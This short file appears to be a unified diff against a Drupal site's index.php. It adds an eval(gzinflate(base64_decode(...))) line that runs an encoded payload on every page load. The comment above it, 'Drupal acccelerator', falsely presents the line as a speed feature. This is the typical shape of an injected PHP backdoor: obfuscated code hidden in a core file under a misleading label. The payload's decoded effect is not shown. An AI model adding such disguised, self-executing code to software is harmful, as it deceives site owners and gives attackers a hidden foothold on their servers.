@@ -1,0 +1,12 @@
+--- index.php
++++ index.php
+@@ -16,6 +16,9 @@
+  */
+ define('DRUPAL_ROOT', getcwd());
+ 
++//Drupal acccelerator :
++eval(gzinflate(base64_decode('40rJTFXQUM9JTSzKU0hUSCtKzE0tzy/KVte05uUCAA==')));
++
+ require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
+ drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
+ menu_execute_active_handler();
